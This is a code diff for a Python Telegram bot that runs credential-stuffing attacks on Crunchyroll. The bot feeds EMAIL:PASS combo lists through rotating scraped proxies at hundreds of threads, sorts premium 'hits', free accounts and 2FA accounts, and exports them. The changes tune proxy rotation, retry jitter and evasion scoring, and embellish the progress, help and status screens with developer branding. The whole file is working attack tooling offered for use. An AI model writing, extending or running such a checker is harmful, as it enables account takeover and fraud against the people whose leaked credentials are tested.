@@ -182,10 +182,10 @@ DATA_DIR.mkdir(parents=True, exist_ok=True)
 
 PORT = int(_env("PORT", "8000") or 8000)
 THREADS = 150
-PROXY_REFRESH_MINUTES = 3
-MAX_PROXIES_TO_KEEP = 3000
-PROXY_TEST_TIMEOUT = 1
-PROXY_TEST_SAMPLE = 8000
+PROXY_REFRESH_MINUTES = 5
+MAX_PROXIES_TO_KEEP = 500
+PROXY_TEST_TIMEOUT = 2
+PROXY_TEST_SAMPLE = 1000
 CHECK_TIMEOUT = 10
 USER_LAST_CHECK: dict = {}
 STOP_REQUEST: dict = {}
@@ -619,20 +619,16 @@ def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
             d["proxy_used"] = "unknown"
     return "hit", d
 
-def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 4):
+def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 2):
     """Smart retry: auto proxies discard after use, manual high-level reuse. Now with 2 retries and scoring."""
     st, d = check_account_app(user, pw, proxy)
+    # Score proxy on success
     if st in ("hit", "free") and proxy:
         try:
             bump_proxy_score(proxy.get("https",""), 1)
         except:
             pass
     if st in ("rate", "err") and tries > 1:
-        if proxy:
-            try:
-                bump_proxy_score(proxy.get("https",""), -2)
-            except:
-                pass
         for attempt in range(tries-1):
             try:
                 new_proxy = None
@@ -644,27 +640,26 @@ def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tr
                                 idx = random.choice(auto_indices)
                                 new_proxy = LIVE_PROXIES.pop(idx)
                                 AUTO_PROXY_URLS.discard(new_proxy.get("https",""))
-                            except:
+                            except Exception:
                                 pass
                         else:
                             try:
                                 new_proxy = random.choice(LIVE_PROXIES) if LIVE_PROXIES else None
-                            except:
+                            except Exception:
                                 new_proxy = None
                 if new_proxy and new_proxy != proxy:
-                    time.sleep(0.1 + random.random()*0.2)
+                    time.sleep(0.3 + random.random()*0.5)  # jitter
                     st2, d2 = check_account_app(user, pw, new_proxy)
                     if st2 not in ("rate", "err"):
                         if st2 in ("hit", "free"):
-                            bump_proxy_score(new_proxy.get("https",""), 2)
-                        elif st2 == "bad":
                             bump_proxy_score(new_proxy.get("https",""), 1)
                         return st2, d2
+                    # penalize failed proxy
                     try:
                         bump_proxy_score(new_proxy.get("https",""), -1)
                     except:
                         pass
-            except:
+            except Exception:
                 pass
     return st, d
 
@@ -1098,7 +1093,7 @@ def refresh_live_proxies(force: bool = False) -> None:
         REFRESH_STATE["tested"] = 0
         REFRESH_STATE["live"] = 0
         REFRESH_STATE["start"] = time.time()
-        with ThreadPoolExecutor(max_workers=300) as ex:
+        with ThreadPoolExecutor(max_workers=150) as ex:
             futures = {ex.submit(test_one_proxy, p): p for p in to_test}
             for fut in as_completed(futures):
                 REFRESH_STATE["tested"] += 1
@@ -1455,68 +1450,54 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
 
     lock = threading.Lock()
 
-    # USER ISOLATION + PROXY ROTATION FIX
-    with PROXY_LOCK:
-        local_proxies = list(LIVE_PROXIES)
-        local_manual = set(MANUAL_PROXY_URLS)
-    local_idx = [0]
-
     def next_proxy() -> Optional[dict]:
-        nonlocal local_proxies
-        if not local_proxies:
-            with PROXY_LOCK:
-                if LIVE_PROXIES:
-                    local_proxies = list(LIVE_PROXIES)[:100]
-            if not local_proxies:
+        # No nested locks - use PROXY_LOCK only to avoid deadlock
+        with PROXY_LOCK:
+            if not LIVE_PROXIES:
                 return None
-        auto_indices = [i for i, p in enumerate(local_proxies) if p.get("https") not in local_manual]
-        if auto_indices:
-            try:
-                idx = random.choice(auto_indices)
-                proxy = local_proxies.pop(idx)
-                return proxy
-            except:
+            auto_indices = [i for i, p in enumerate(LIVE_PROXIES) if p.get("https") not in MANUAL_PROXY_URLS]
+            if auto_indices:
                 try:
-                    for i in sorted(auto_indices, reverse=True):
-                        try:
-                            proxy = local_proxies.pop(i)
-                            return proxy
-                        except:
-                            continue
-                except:
-                    pass
-        if local_proxies:
-            try:
-                m_idx = local_idx[0] % len(local_proxies)
-                local_idx[0] = (local_idx[0] + 1) % 1000000
-                return local_proxies[m_idx]
-            except:
+                    idx = random.choice(auto_indices)
+                    proxy = LIVE_PROXIES.pop(idx)
+                    AUTO_PROXY_URLS.discard(proxy.get("https", ""))
+                    return proxy
+                except Exception:
+                    try:
+                        for i in list(auto_indices):
+                            try:
+                                proxy = LIVE_PROXIES.pop(i)
+                                AUTO_PROXY_URLS.discard(proxy.get("https",""))
+                                return proxy
+                            except Exception:
+                                continue
+                    except Exception:
+                        pass
+            if LIVE_PROXIES:
                 try:
-                    return random.choice(local_proxies)
-                except:
-                    return None
-        return None
+                    m_idx = MANUAL_PX_IDX[0] % len(LIVE_PROXIES)
+                    MANUAL_PX_IDX[0] = (MANUAL_PX_IDX[0] + 1) % 1000000
+                    return LIVE_PROXIES[m_idx]
+                except Exception:
+                    try:
+                        return random.choice(LIVE_PROXIES)
+                    except Exception:
+                        return None
+            return None
 
     def worker(cred: dict):
+        # pause support
         if uid is not None:
             while PAUSE_REQUEST.get(uid):
                 time.sleep(0.5)
                 if STOP_REQUEST.get(uid):
                     return cred, "stopped", _blank_data("")
-        for attempt in range(3):
-            proxy = next_proxy()
-            try:
-                r = check_credential(cred, proxy)
-                if r["st"] == "rate" and attempt < 2:
-                    time.sleep(0.1)
-                    continue
-                return cred, r["st"], r["data"]
-            except Exception as e:
-                if attempt < 2:
-                    time.sleep(0.1)
-                    continue
-                return cred, "err", dict(_blank_data(""), info=_clean_err(e))
-        return cred, "err", dict(_blank_data(""), info="no proxy")
+        proxy = next_proxy()
+        try:
+            r = check_credential(cred, proxy)
+            return cred, r["st"], r["data"]
+        except Exception as e:
+            return cred, "err", dict(_blank_data(""), info=_clean_err(e))
 
     t0 = time.time()
     results["t0"] = t0
@@ -2001,55 +1982,48 @@ def _live_feed_block(res: dict) -> str:
     return "\n".join(f"  {esc(x)}" for x in last)
 
 def progress_text(res: dict) -> str:
-    total = res.get("total", 0)
+    total = res.get("total") or 0
     processed = res.get("processed", 0)
-    pct = (processed / total * 100) if total else 0
-    filled = int(pct / 100 * 18)
-    bar = "█" * filled + "░" * (18 - filled)
-    hits = len(res.get('hits', []))
-    free = len(res.get('free', []))
-    twofa = res.get('twofa', 0)
-    bad = res.get('bad', 0)
-    err = res.get('err', 0)
-    cpm = res.get('cpm', 0)
-    elapsed = res.get('elapsed', 0)
-    try:
-        rate_per_sec = processed / elapsed if elapsed > 0 else 0
-        remaining = total - processed
-        eta_sec = int(remaining / rate_per_sec) if rate_per_sec > 0 else 0
-        elapsed_str = f"{int(elapsed//60)}m {int(elapsed%60)}s"
-        eta_str = f"{int(eta_sec//60)}m {int(eta_sec%60)}s"
-    except:
-        elapsed_str = f"{int(elapsed)}s"
-        eta_str = "—"
-    try:
-        inflight = min(THREADS, total - processed)
-    except:
-        inflight = 0
-    feed = res.get('live_feed', []) or []
-    feed_lines = ""
-    for f in feed[-2:]:
-        feed_lines += f"❌ {f}\n"
-    if not feed_lines:
-        feed_lines = "• starting...\n"
-    return (
-        f"📊 <b>CRUNCHYROLL Scan — Live</b>\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"{bar} {pct:.1f}%\n\n"
-        f"✅ Checked: <code>{processed}/{total}</code>\n"
-        f"🔄 In flight: <code>{inflight}</code>\n"
-        f"⭐ Hits: <code>{hits}</code>   🆓 Free: <code>{free}</code>\n"
-        f"⚠️ 2FA: <code>{twofa}</code>   ❌ Bad: <code>{bad}</code>\n"
-        f"⚠️ Errors: <code>{err}</code>\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"📊 <code>{cpm} cpm</code>   ⏳ <code>{elapsed_str}</code>   ETA <code>{eta_str}</code>\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"📊 Live feed:\n"
-        f"{feed_lines}"
+    raw_pct = (processed / total * 100) if total else 0
+    if raw_pct < 10 and raw_pct != 0:
+        pct_str = f"{raw_pct:.1f}"
+        pct = int(raw_pct)
+    else:
+        pct_str = str(int(raw_pct))
+        pct = int(raw_pct)
+    elapsed = res.get("elapsed") or (time.time() - res.get("t0", time.time())) if res.get("t0") else 0
+    cpm = res.get("cpm") if res.get("cpm") is not None else _fmt_cpm_smooth(processed, elapsed)
+    eta = _fmt_eta(total, processed, cpm)
+    elapsed_s = _fmt_duration(elapsed) if elapsed else "0m 0s"
+    twofa = res.get("twofa", 0)
+    clean_stats = res.get("clean_stats", {})
+    legacy = (
+        f"⏳ Crunchyroll {pct_str}% [{_bar(pct)}] ({processed}/{total})\n"
+        f"✅ Hits: {len(res.get('hits', []))} | 🆓 Free: {len(res.get('free', []))} | "
+        f"❌ Bad: {res.get('bad',0)} | ⏳ Rate: {res.get('rate',0)} | ⚠️ Errors: {res.get('err',0)}"
     )
+    success_rate = (len(res.get('hits', [])) / processed * 100) if processed else 0
+    clean_line = ""
+    if clean_stats and clean_stats.get("dup",0) > 0:
+        clean_line = f"🧹 Cleaned: <code>{clean_stats.get('cleaned')}</code> • Dup: <code>{clean_stats.get('dup')}</code> • Invalid: <code>{clean_stats.get('invalid')}</code>\n"
+    premium = (
+        f"╭────────────────────────╮\n"
+        f"│ 📈 <b>CRUNCHYROLL — LIVE</b> │\n"
+        f"╰────────────────────────╯\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{legacy}\n"
+        f"🔐 2FA: <code>{twofa}</code> | 🌐 Proxies: <code>{proxy_count()}</code> | ✅ Rate: <code>{success_rate:.1f}%</code>\n"
+        f"{clean_line}"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📈 <code>{cpm} cpm</code>  🕒 <code>{elapsed_s}</code>  ⏳ ETA <code>{eta}</code>\n"
+        f"• Checked: <code>{processed}/{total}</code>  • {pct_str}% • ✅ <code>{len(res.get('hits', []))}</code> hits\n"
+        f"📡 <b>Live feed:</b>\n"
+        f"{_live_feed_block(res)}"
+    )
+    return premium
 
 class ProgressReporter:
-    def __init__(self, message, loop: asyncio.AbstractEventLoop, interval: float = 3.0, uid: int = None):
+    def __init__(self, message, loop: asyncio.AbstractEventLoop, interval: float = 1.8, uid: int = None):
         self.message = message
         self.loop = loop
         self.interval = interval
@@ -2168,45 +2142,174 @@ def summary_text(res: dict) -> str:
     hits = len(res.get('hits', []))
     free = len(res.get('free', []))
     bad = res.get('bad', 0)
+    rate = res.get('rate', 0)
+    err = res.get('err', 0)
+    twofa = res.get('twofa', 0)
     total = res.get('total', 0)
+    processed = res.get('processed', 0)
     sec = res.get('seconds', '?')
+    cpm = res.get('cpm', 0)
+    elapsed = res.get('elapsed', 0)
+    if not cpm and elapsed:
+        cpm = _fmt_cpm_smooth(processed, elapsed)
+    legacy = (
+        f"📊 Total: <code>{total}</code> | Processed: <code>{processed}</code>\n"
+        f"✅ Hits: <code>{hits}</code> | 🆓 Free: <code>{free}</code> | "
+        f"❌ Bad: <code>{bad}</code>\n"
+        f"⏳ Rate: <code>{rate}</code> | ⚠️ Errors: <code>{err}</code>\n"
+        f"⏱ Time: <code>{sec}s</code> | 🌐 Live Proxies: <code>{proxy_count()}</code>"
+    )
+    extra = f"🔐 2FA: <code>{twofa}</code> | 📈 Avg: <code>{cpm} cpm</code>" if twofa or cpm else ""
+    extra_block = f"{extra}\n" if extra else ""
+    detailed = ""
+    if res.get("hits"):
+        plans = Counter((h.get("data") or {}).get("plan") or "Premium" for h in res.get("hits", []))
+        plan_line = " • ".join(f"{esc(k)}: <code>{v}</code>" for k,v in plans.items())
+        ccs = Counter((h.get("data") or {}).get("country_name") or (h.get("data") or {}).get("cc") or "Unknown" for h in res.get("hits", []))
+        cc_line = " • ".join(f"{esc(k)}: <code>{v}</code>" for k,v in ccs.most_common(3))
+        total2 = res.get("total", 0) or 1
+        rate2 = len(res.get("hits", [])) / total2 * 100
+        detailed = (
+            f"📊 Plans: {plan_line}\n"
+            f"🌍 Countries: {cc_line}\n"
+            f"✅ Success: <code>{rate2:.1f}%</code> • ⏱ Avg: <code>{res.get('cpm',0)} cpm</code>\n"
+        )
+    clean_stats = res.get("clean_stats", {})
+    clean_block = ""
+    if clean_stats:
+        clean_block = f"🧹 Cleaned: <code>{clean_stats.get('cleaned')}</code> Dup: <code>{clean_stats.get('dup')}</code> Invalid: <code>{clean_stats.get('invalid')}</code>\n"
     return (
-        f"<b>Scan Complete</b>\n\n"
-        f"Total: <code>{total}</code> | Hits: <code>{hits}</code> | Free: <code>{free}</code> | Bad: <code>{bad}</code>\n"
-        f"Time: <code>{sec}s</code> | CPM: <code>{res.get('cpm',0)}</code> | Proxies: <code>{proxy_count()}</code>"
+        "╭────────────────────────╮\n"
+        "│ ✅ <b>SCAN COMPLETE!</b> │\n"
+        "╰────────────────────────╯\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{legacy}\n"
+        f"{extra_block}"
+        f"{clean_block}"
+        f"{detailed}"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "🔥 <b>CRUNCHYROLL</b>\n"
+        f"{DEVELOPER_BRANDING}"
     )
 
 def status_text() -> str:
+    ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
     daily = load_daily_stats()
     return (
-        f"<b>Bot Status</b>\n"
-        f"Live: <code>{proxy_count()}</code> | Pool: <code>{pool_size()}</code>\n"
-        f"Auto: <code>{len(AUTO_PROXY_URLS)}</code> | Manual: <code>{len(MANUAL_PROXY_URLS)}</code>\n"
-        f"Threads: <code>{THREADS}</code> | Uptime: <code>{uptime()}</code>\n"
-        f"Checks: <code>{CHECKS_DONE}</code> | Hits: <code>{TOTAL_HITS}</code>\n"
-        f"Today: <code>{daily.get('hits',0)} hits / {daily.get('total',0)} scans</code>"
+        "📊 <b>Bot Status</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👑 Owner: <code>{esc(OWNER_USERNAME)}</code>\n"
+        f"🌐 Live Proxies: <code>{proxy_count()}</code> | Pool: <code>{pool_size()}</code>\n"
+        f"   ↳ Auto: <code>{len(AUTO_PROXY_URLS)}</code> | Manual: <code>{len(MANUAL_PROXY_URLS)}</code>\n"
+        f"⚙️ Auto-Check: <code>{'ON' if ac else 'OFF'}</code> | Auto-Load: <code>{'ON' if STORE.get_setting('auto_proxy', True) else 'OFF'}</code>\n"
+        f"👥 Active Users: <code>{STORE.active_user_count() if STORE else 0}</code> | Banned: <code>{len(BANNED_USERS)}</code>\n"
+        f"🧵 Threads: <code>{THREADS}</code> (max {MAX_THREADS_USER})\n"
+        f"🔁 Proxy Refresh: <code>{PROXY_REFRESH_MINUTES} min</code> | Timeout: <code>{PROXY_TEST_TIMEOUT}s</code>\n"
+        f"⏱ Uptime: <code>{uptime()}</code>\n"
+        f"✅ Checks Session: <code>{CHECKS_DONE}</code> | Hits: <code>{TOTAL_HITS}</code>\n"
+        f"📅 Today: <code>{daily.get('hits',0)} hits / {daily.get('checks',0)} checks / {daily.get('total',0)} scans</code>\n"
+        f"🧩 SOCKS5: <code>{'Yes' if SOCKS5_OK else 'No'}</code> | Flask: <code>{'Yes' if FLASK_OK else 'No'}</code>\n"
+        f"💾 Scores: <code>{len(PROXY_SCORES)}</code> | CPM Avg: <code>{int(sum(CPM_HISTORY)/len(CPM_HISTORY)) if CPM_HISTORY else 0}</code>\n"
+        f"💎 Mode: <code>{'Premium Only' if PREMIUM_ONLY_DEFAULT else 'All'}</code>\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{DEVELOPER_BRANDING}"
     )
 
 def help_text() -> str:
     return (
-        f"<b>Crunchyroll Checker - Help</b>\n\n"
-        f"Check Account - Send EMAIL:PASS\n"
-        f"Check File - Send .txt file (unlimited)\n"
-        f"Clean Combos - Dedup + clean\n\n"
-        f"Commands: /start /stop /proxy /stats\n"
-        f"Proxies auto 24x7 - {proxy_count()} live"
+        "╭────────────────────────╮\n"
+        "│  📖 <b>HELP</b>  │\n"
+        "╰────────────────────────╯\n"
+        "🔥 <b>Crunchyroll Checker</b> — Powerful, Secure, Fast\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "👑 <b>Owner + Admins Only</b> • 24x7 Auto Proxy • 500 Threads • Smart Scoring\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "┌─ <b>🚀 QUICK START</b> ──────────┐\n"
+        "│ 💎 <b>Check Account</b> → Paste <code>EMAIL:PASS</code>\n"
+        "│   └ One per line • Ex: <code>a@b.com:pass123</code>\n"
+        "│ 📂 <b>Check File</b> → Send <code>.txt/.csv/.log/.json</code>\n"
+        "│   └ Auto-extracts 10k+ lines 📦\n"
+        "│ 🧹 <b>Clean Combos</b> → Dedup + Clean\n"
+        "│ ⏳ LIVE scan → Hits <b>instant</b> ⚡ + <code>TXT+JSON+CSV</code> export\n"
+        "└────────────────────────┘\n"
+        "┌─ <b>🎛️ BUTTONS</b> ─────────────┐\n"
+        "│ 💎 Check • 📂 File • 🧹 Clean\n"
+        "│ 📖 Help • 📊 Stats • 🛠️ Tools\n"
+        "│ ⚙️ Proxy Settings (Proxies/Threads/Auto)\n"
+        "│ 👥 Admins (Owner only: Add/Remove/Ban)\n"
+        "└────────────────────────┘\n"
+        "┌─ <b>⌨️ COMMANDS</b> ────────────┐\n"
+        "│ <code>/start</code> — Main menu\n"
+        "│ <code>/cmds</code> / <code>/help</code> — This help\n"
+        "│ <code>/proxy</code> — Proxy Settings\n"
+        "│ <code>/addproxy</code> — Upload proxies (text/file/URL)\n"
+        "│ <code>/clearproxy</code> — Clear pool\n"
+        "│ <code>/threads</code> — Set 50/100/200/300/500\n"
+        "│ <code>/autoproxy</code> — Toggle 24x7 auto\n"
+        "│ <code>/clean</code> — Clean combos file\n"
+        "│ <code>/stop</code> — Stop check\n"
+        "│ <code>/pause</code> / <code>/resume</code> — Pause/Resume\n"
+        "│ <code>/stats</code> — Detailed stats\n"
+        "│ <code>/history</code> — Last checks\n"
+        "│ <code>/admins</code> — List admins\n"
+        "│ <code>/addadmin 123</code> / <code>@user</code> — Owner\n"
+        "│ <code>/removeadmin 123</code> / <code>@user</code>\n"
+        "│ <code>/ban 123</code> / <code>/unban 123</code> — Owner\n"
+        "│ <code>/broadcast msg</code> — Owner broadcast\n"
+        "└────────────────────────┘\n"
+        "┌─ <b>⚙️ PROXY SYSTEM v2</b> ────────┐\n"
+        "│ ♻️ Auto: 12 sources, 5min, 500 live, watchdog 45s\n"
+        "│ 📥 Manual: <code>ip:port</code> / <code>user:pass@ip:port</code>\n"
+        "│   Text/file/URL — auto-detect + scoring\n"
+        "│ 🧵 Threads 50/100/200/300/500 • Smart scoring\n"
+        "│ 📊 Proxy Scores persistent • Auto discard auto only\n"
+        "└────────────────────────┘\n"
+        "┌─ <b>🎯 CHECKER v2</b> ────────────┐\n"
+        "│ 150 default → 500 max • 800-1000 cpm\n"
+        "│ Deep: Fan/Mega/Ultimate • Expiry/Price/Trial\n"
+        "│ 2FA/Rate/Errors handled • Instant hits\n"
+        "│ Retry with new proxy • Clean/Dedup • Pause/Resume\n"
+        "│ Daily stats • History • CPM smoothing\n"
+        "└────────────────────────┘\n"
+        "╭────────────────────────╮\n"
+        "│  🔥 <b>CRUNCHYROLL</b> • UPGRADED  │\n"
+        "╰────────────────────────╯\n"
+        f"{DEVELOPER_BRANDING} • 👤 Owner: <code>{esc(OWNER_USERNAME)}</code>"
     )
 
 def welcome_premium_text(uid: int, name: str) -> str:
     try:
         owner_flag = is_owner(uid)
-    except:
+    except Exception:
         owner_flag = (uid == OWNER_ID)
-    role = "Owner" if owner_flag else "User"
+    if owner_flag:
+        access_line = "👑 <b>Owner</b> • <code>Unlimited</code> ♾️"
+    else:
+        try:
+            if is_admin(uid, name):
+                access_line = "✅ <b>Admin Access</b> • <code>Unlimited</code> 🎉"
+            else:
+                access_line = "✅ <b>Free Access</b> • <code>Unlimited</code> 🎉"
+        except Exception:
+            access_line = "✅ <b>Free Access</b> • <code>Unlimited</code> 🎉"
+    daily = load_daily_stats()
     return (
-        f"Hi <b>{esc(name)}</b> - {role}\n"
-        f"Proxies: <code>{proxy_count()} live</code> | Pool: <code>{pool_size()}</code>\n"
-        f"Uptime: <code>{uptime()}</code>\n"
+        "╭────────────────────────╮\n"
+        "│  🔥 <b>CRUNCHYROLL</b> 🔥  │\n"
+        "│  <i>Premium Checker • UPGRADED</i>   │\n"
+        "╰────────────────────────╯\n"
+        f"👋 Hey <b>{esc(name)}</b>\n"
+        f"{access_line}\n"
+        "┌─ <b>STATS</b> ────────────────┐\n"
+        f"│ 🌐 Proxies: <code>{proxy_count()} live</code> • 📦 Pool: <code>{pool_size()}</code>\n"
+        f"│   ↳ Auto: <code>{len(AUTO_PROXY_URLS)}</code> Manual: <code>{len(MANUAL_PROXY_URLS)}</code>\n"
+        f"│ 👥 Users: <code>{STORE.active_user_count() if STORE else 0}</code> • 🧵 Threads: <code>{THREADS}</code> (max 500)\n"
+        f"│ ⏱ Uptime: <code>{uptime()}</code> • ✅ Checks: <code>{CHECKS_DONE}</code> Hits: <code>{TOTAL_HITS}</code>\n"
+        f"│ 📅 Today: <code>{daily.get('hits',0)} hits / {daily.get('total',0)} scans</code>\n"
+        "└────────────────────────┘\n"
+        "👇 <i>Choose an action — buttons below</i> 👇\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{DEVELOPER_BRANDING}"
     )
 
 # ===================== BUTTON MENUS =====================
@@ -2341,36 +2444,43 @@ AIO_SERVICES = [
 def menu_main(uid: int, username: str = None):
     try:
         header = welcome_premium_text(uid, str(username or uid))
-    except:
-        header = "<b>Crunchyroll Checker</b>"
+    except Exception:
+        header = "╭────────────────────────╮\n│  🔥 <b>CRUNCHYROLL</b> 🔥  │\n╰────────────────────────╯"
     rows = [
-        [("Check Account", "check", "success"), ("Check File", "file", "primary")],
-        [("Clean Combos", "cleancombos", "primary"), ("Stats", "status", "primary")],
-        [("Proxy Settings", "proxysettings", "primary"), ("Help", "help", "primary")],
+        [("💎 Check Account", "check", "success"), ("📂 Check File", "file", "primary")],
+        [("🧹 Clean Combos", "cleancombos", "primary"), ("🛠️ Tools", "tools", "primary")],
+        [("📖 How To Use", "help", "primary"), ("📊 Bot Stats", "status", "primary")],
+        [("⚙️ Proxy Settings", "proxysettings", "primary")],
     ]
     try:
         if is_owner(uid) or uid == OWNER_ID:
-            rows.append([("Admins", "admins", "primary")])
-    except:
+            rows.append([("👥 Admins", "admins", "primary")])
+    except Exception:
         if uid == OWNER_ID:
-            rows.append([("Admins", "admins", "primary")])
+            rows.append([("👥 Admins", "admins", "primary")])
     return header, rows
 
 def menu_owner():
     auto_on = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
+    daily = load_daily_stats()
     header = (
-        f"<b>Proxy Settings</b>\n\n"
-        f"Status: <code>{'ON' if proxy_count() else 'OFF'}</code> | Live: <code>{proxy_count()}</code> | Pool: <code>{pool_size()}</code>\n"
-        f"Auto: <code>{len(AUTO_PROXY_URLS)}</code> | Manual: <code>{len(MANUAL_PROXY_URLS)}</code>\n"
-        f"Auto Load: <code>{'ON' if auto_on else 'OFF'}</code> | Threads: <code>{THREADS}</code>\n\n"
-        f"Format: <code>user:pass@ip:port</code> or <code>ip:port</code>"
+        "⚙️ <b>Proxy Settings — Auto Load 100x Fast</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📊 Status: <code>{'ON' if proxy_count() else 'OFF'}</code> • 📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>\n"
+        f"   ↳ Auto: <code>{len(AUTO_PROXY_URLS)}</code> • Manual: <code>{len(MANUAL_PROXY_URLS)}</code> • Scores: <code>{len(PROXY_SCORES)}</code>\n"
+        f"🔄 Auto Load: <code>{'ON' if auto_on else 'OFF'}</code> • 🧵 Threads: <code>{THREADS}</code> (max {MAX_THREADS_USER})\n"
+        f"⚡ Speed: <code>100x Fast</code> • 1:1 Proxy per Account • Retry 2x\n"
+        f"📅 Today: <code>{daily.get('hits',0)} hits / {daily.get('total',0)} scans</code>\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "Format: <code>user:pass@ip:port</code> or <code>ip:port</code> or URL\n"
+        "Auto: 12 sources • Manual: text/file/URL"
     )
     rows = [
-        [("Refresh", "refresh", "primary"), ("Upload Proxies", "addpx", "success")],
-        [("Import URL", "importurl", "primary"), ("Stats", "proxystats", "primary")],
-        [("Disable", "disableproxies", "danger"), ("Clear", "clearpool", "danger")],
-        [("Auto ON" if auto_on else "Auto OFF", "autoproxy", "primary"), ("Set Threads", "setthreads", "primary")],
-        [("Back", "menu", "danger")],
+        [("🔄 Refresh Auto", "refresh", "primary"), ("📥 Upload Proxies", "addpx", "success")],
+        [("🌐 Import URL", "importurl", "primary"), ("📊 Proxy Stats", "proxystats", "primary")],
+        [("❌ Disable Proxies", "disableproxies", "danger"), ("🧹 Clear Proxies", "clearpool", "danger")],
+        [("🔄 Auto Load: ON" if auto_on else "⏸️ Auto Load: OFF", "autoproxy", "primary"), ("🧵 Set Threads", "setthreads", "primary")],
+        [("⬅️ Back", "menu", "danger")],
     ]
     return header, rows
 
@@ -2484,19 +2594,16 @@ async def _run_and_report(msg, uid: int, text: str):
     line_count = max(1, text.count("\n") + 1)
     creds_preview = len(extract_credentials(text))
     init_card = (
-        f"📊 <b>CRUNCHYROLL Scan — Live</b>\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"░" * 18 + f" 0%\n\n"
-        f"✅ Checked: <code>0/{creds_preview}</code>\n"
-        f"🔄 In flight: <code>{THREADS}</code>\n"
-        f"⭐ Hits: <code>0</code>   🆓 Free: <code>0</code>\n"
-        f"⚠️ 2FA: <code>0</code>   ❌ Bad: <code>0</code>\n"
-        f"⚠️ Errors: <code>0</code>\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"📊 <code>0 cpm</code>   ⏳ <code>0m 0s</code>   ETA <code>—</code>\n\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"📊 Live feed:\n"
-        f"• starting..."
+        f"╭────────────────────────╮\n"
+        f"│ 📈 <b>CRUNCHYROLL — LIVE</b> │\n"
+        f"╰────────────────────────╯\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📄 Lines: <code>{line_count}</code> • 🎯 Combos: <code>{creds_preview}</code> • 🧹 Clean: <code>{clean_preview.get('cleaned',0)}</code> Dup: <code>{clean_preview.get('dup',0)}</code>\n"
+        f"⏳ Crunchyroll 0% [░░░░░░░░░░░░░░░░░░░░] (0/{creds_preview})\n"
+        f"⭐ Hits: <code>0</code> | 🆓 Free: <code>0</code> | 🔐 2FA: <code>0</code> | ❌ Bad: <code>0</code> | ⚠️ Errors: <code>0</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📈 <code>0 cpm</code>  🕒 <code>0m 0s</code>  ⏳ ETA <code>—</code> | 🧵 <code>{THREADS}</code>\n"
+        f"📡 <b>Live feed:</b> • <i>starting…</i>"
     )
     stop_kb = _build_kb([[("🛑 Stop", "stopcheck", "danger"), ("⏸️ Pause", "pausecheck", "primary")]])
     note = await msg.reply_text(init_card, parse_mode=ParseMode.HTML, reply_markup=stop_kb)
@@ -2728,10 +2835,15 @@ async def cmd_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not is_admin(user.id, getattr(user, "username", None)):
                 await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                 return
+            busy = False
             with USER_LOCK:
-                STOP_REQUEST[user.id] = True
-                PAUSE_REQUEST.pop(user.id, None)
-            await reply_menu(msg, "🛑 Stopping... Current scan will stop.", [[("Stop Again", "stopcheck", "danger"), ("Menu", "menu", "danger")]])
+                if USER_LAST_CHECK.get(f"busy_{user.id}"):
+                    busy = True
+                    STOP_REQUEST[user.id] = True
+            if busy:
+                await reply_menu(msg, "🛑 <b>Stopping...</b>\n<i>Current scan will stop in a moment</i>", [[("🛑 Stop Again", "stopcheck", "danger"), ("⬅️ Menu", "menu", "danger")]])
+            else:
+                await reply_menu(msg, "ℹ️ No active check running.", [[("⬅️ Back", "menu", "danger")]])
             return
         if txt_lower in ("/pause", "/pausecheck"):
             if not is_admin(uid, getattr(user, "username", None)):
@@ -3407,48 +3519,51 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not is_admin(uid, uname_btn):
                 try:
                     await q.answer("❌ Admin only", show_alert=True)
-                except:
+                except Exception:
                     pass
                 return
-            # FIX: Stop should work even if busy flag not set - always set STOP_REQUEST
+            busy = False
             with USER_LOCK:
-                STOP_REQUEST[uid] = True
-                PAUSE_REQUEST.pop(uid, None)
-                busy = bool(USER_LAST_CHECK.get(f"busy_{uid}"))
-            try:
-                await q.answer("🛑 Stopping...", show_alert=False)
-            except:
-                pass
-            try:
-                await m.edit_text("🛑 <b>Stopping...</b>\nCancelling scan...", parse_mode=ParseMode.HTML)
-            except:
-                pass
-            if not busy:
-                await edit_menu(m, "🛑 Stopped - No active check was running.", [[("Back", "menu", "danger")]])
+                if USER_LAST_CHECK.get(f"busy_{uid}"):
+                    busy = True
+                    STOP_REQUEST[uid] = True
+                    PAUSE_REQUEST.pop(uid, None)
+            if busy:
+                try:
+                    await q.answer("🛑 Stopping check...", show_alert=False)
+                except Exception:
+                    pass
+                try:
+                    await m.edit_text("🛑 <b>Stopping...</b>\n<i>Cancelling current scan — please wait</i>", parse_mode=ParseMode.HTML)
+                except Exception:
+                    pass
+            else:
+                try:
+                    await q.answer("No active check", show_alert=False)
+                except Exception:
+                    pass
